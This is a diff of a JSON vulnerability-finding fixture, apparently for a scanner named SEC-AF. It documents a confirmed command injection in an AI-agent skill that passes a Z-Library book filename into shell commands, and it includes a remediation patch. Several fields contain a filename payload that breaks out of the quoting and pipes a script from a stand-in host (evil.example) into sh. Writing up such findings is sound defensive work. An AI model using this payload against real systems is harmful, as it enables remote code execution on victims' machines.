@@ -1,25 +1,26 @@
 {
-  "_note": "Community-contributed real-world finding demonstrating the OS command-injection class SEC-AF detects in AI-agent skills. The vulnerable project is an MIT-licensed Claude/agent 'skill' (zlibrary-to-notebooklm) whose automation downloads a book and shells out to the NotebookLM CLI. This finding was confirmed by data-flow analysis and has been remediated (see `remediation`); it is provided as an example/fixture, not a live 0-day.",
+  "_note": "Community-contributed real-world finding demonstrating the OS command-injection class SEC-AF detects in AI-agent skills. The vulnerable project is an MIT-licensed Claude/agent 'skill' (zlibrary-to-notebooklm) whose automation downloads a book and shells out to the NotebookLM CLI. This finding was confirmed by data-flow analysis and has been remediated (see `remediation`); it is provided as an example/fixture, not a live 0-day. Field shape conforms to sec_af.schemas.prove.VerifiedFinding so it loads via VerifiedFinding.model_validate(...).",
   "id": "af-zl2nlm-cmdi-0001",
   "fingerprint": "af-zl2nlm-cmdi-0001",
   "title": "OS Command Injection via Attacker-Controlled Book Filename in zlibrary-to-notebooklm upload.py",
-  "severity": "high",
-  "verdict": "confirmed",
-  "evidence_level": 5,
-  "exploitability_score": 3.0,
+  "description": "scripts/upload.py builds NotebookLM CLI and epub-conversion commands as Python f-strings and runs them via subprocess.run(..., shell=True). The interpolated `title`, `file_path`, and `chunk_file` all derive from `download.suggested_filename` - the filename of a book fetched from Z-Library, which is controlled by whoever uploaded that book. A book named with shell metacharacters (e.g. a single-quote to break out of the quoting, followed by `; <command>; '`) causes the agent to execute arbitrary OS commands on the victim's machine when the skill processes the download. There are seven such sinks (one in convert_to_txt, six in upload_to_notebooklm across the multi-chunk and single-file branches).",
   "finding_type": "sast",
   "cwe_id": "CWE-78",
   "cwe_name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
   "owasp_category": "A03:2021 - Injection",
-  "description": "scripts/upload.py builds NotebookLM CLI and epub-conversion commands as Python f-strings and runs them via subprocess.run(..., shell=True). The interpolated `title`, `file_path`, and `chunk_file` all derive from `download.suggested_filename` - the filename of a book fetched from Z-Library, which is controlled by whoever uploaded that book. A book named with shell metacharacters (e.g. a single-quote to break out of the quoting, followed by `; <command>; '`) causes the agent to execute arbitrary OS commands on the victim's machine when the skill processes the download. There are seven such sinks (one in convert_to_txt, six in upload_to_notebooklm across the multi-chunk and single-file branches).",
-  "location": {
-    "file_path": "scripts/upload.py",
-    "function_name": "upload_to_notebooklm / convert_to_txt",
-    "start_line": 432,
-    "end_line": 555,
-    "code_snippet": "cmd = f\"nlm source add '{file_path}' --json\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True)"
-  },
+  "tags": ["command-injection", "ai-agent-skill", "subprocess", "shell-true", "cwe-78"],
+  "verdict": "confirmed",
+  "evidence_level": 5,
+  "rationale": "Static data-flow analysis confirms the attacker-controlled Z-Library filename (download.suggested_filename) reaches seven subprocess.run(..., shell=True) sinks in scripts/upload.py without sanitisation. The single quotes wrapping the interpolated values in the f-strings are not a defence: a single-quote inside the filename closes the quoting and lets following shell metacharacters execute. Verdict CONFIRMED at evidence level 5 (EXPLOIT_SCENARIO_VALIDATED) - a concrete exploit input is demonstrated and the source-to-sink path is verified; it is not level 6 (FULL_EXPLOIT) because no live PoC was executed against a victim host.",
+  "severity": "high",
+  "exploitability_score": 3.0,
   "proof": {
+    "exploit_hypothesis": "An attacker uploads a book to Z-Library named:  '; curl https://evil.example/x.sh | sh; '.epub  . The leading single-quote closes the quoting in the f-string, the `;` terminates the intended command, and the injected `curl | sh` runs with the privileges of the user running the skill. When the victim runs the skill on that book (the skill auto-downloads and processes it), the agent shells out via /bin/sh -c and the payload executes -> remote code execution. The wrapping single-quotes in the f-strings are not a defence: a `'` in the filename escapes them.",
+    "verification_method": "Static source-to-sink taint tracing over scripts/upload.py: the tainted filename is followed from download.suggested_filename through the saved download path into seven f-string-built commands executed with shell=True. No dynamic exploit was run against a live host (no DAST / no PoC execution), hence evidence level 5 rather than 6.",
+    "evidence_level": 5,
+    "vulnerable_code": "cmd = f\"nlm source add '{file_path}' --json\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True)",
+    "exploit_payload": "'; curl https://evil.example/x.sh | sh; '.epub",
+    "expected_outcome": "Arbitrary OS commands execute with the privileges of the user running the skill -> remote code execution on the victim host.",
     "data_flow_evidence": {
       "source": "download.suggested_filename in download_from_zlibrary() - the Z-Library book filename, attacker-controllable by the book uploader",
       "sink": "subprocess.run(cmd, shell=True) in convert_to_txt() and upload_to_notebooklm()",
@@ -33,8 +34,14 @@
         { "file": "scripts/upload.py", "line": 554, "tainted": true, "description": "cmd = f\"nlm source add '{file_path}' --json\"  -- tainted path interpolated into a shell string" },
         { "file": "scripts/upload.py", "line": 555, "tainted": true, "description": "subprocess.run(cmd, shell=True, ...)  -- SINK: shell=True executes the interpolated string via /bin/sh -c" }
       ]
-    },
-    "exploit_scenario": "An attacker uploads a book to Z-Library named:  '; curl https://evil.example/x.sh | sh; '.epub  . The single-quote closes the quoting in the f-string, the `;` terminates the intended command, and the injected `curl | sh` runs with the privileges of the user running the skill. When the victim runs the skill on that book (the skill auto-downloads and processes it), the agent shells out and the payload executes -> remote code execution. The wrapping single-quotes in the f-strings are not a defence: a `'` in the filename escapes them."
+    }
+  },
+  "location": {
+    "file_path": "scripts/upload.py",
+    "function_name": "upload_to_notebooklm / convert_to_txt",
+    "start_line": 432,
+    "end_line": 555,
+    "code_snippet": "cmd = f\"nlm source add '{file_path}' --json\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True)"
   },
   "compliance": [
     { "framework": "OWASP", "control_id": "A03:2021", "control_name": "Injection" },
@@ -44,12 +51,12 @@
     { "framework": "ISO27001", "control_id": "A.8.28", "control_name": "Secure coding" }
   ],
   "remediation": {
-    "summary": "Pass arguments as a list with shell=False (the subprocess default) so interpolated, attacker-controlled values are treated as data, never shell tokens.",
-    "before": "cmd = f\"nlm source add '{file_path}' --json\"\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True)",
-    "after": "result = subprocess.run([\"nlm\", \"source\", \"add\", str(file_path), \"--json\"], capture_output=True, text=True)",
-    "status": "fixed",
-    "notes": "All seven invocations refactored to list-argv; binary name, JSON parsing, return shapes, retry/error handling, and sequential upload behaviour preserved. Verified with python -m py_compile and a zero-shell=True grep."
+    "fix_description": "Pass arguments as a list with shell=False (the subprocess default) so the interpolated, attacker-controlled values are treated as data, never shell tokens. All seven invocations refactored to list-argv; binary name, JSON parsing, return shapes, retry/error handling, and sequential upload behaviour preserved. Verified with `python -m py_compile` and a zero-`shell=True` grep.",
+    "patch_diff": "--- a/scripts/upload.py\n+++ b/scripts/upload.py\n@@ def upload_to_notebooklm(self, file_path):\n-        cmd = f\"nlm source add '{file_path}' --json\"\n-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n+        result = subprocess.run(\n+            [\"nlm\", \"source\", \"add\", str(file_path), \"--json\"],\n+            capture_output=True,\n+            text=True,\n+        )\n@@ def convert_to_txt(self, file_path, md_file):\n-        cmd = f\"python3 '{convert_script}' '{file_path}' '{md_file}'\"\n-        subprocess.run(cmd, shell=True, ...)\n+        subprocess.run(\n+            [\"python3\", str(convert_script), str(file_path), str(md_file)],\n+            ...\n+        )",
+    "confidence": "high"
   },
+  "sarif_rule_id": "sec-af/python/os-command-injection-shell-true",
+  "sarif_security_severity": 8.8,
   "references": [
     "https://cwe.mitre.org/data/definitions/78.html",
     "https://owasp.org/Top10/A03_2021-Injection/",
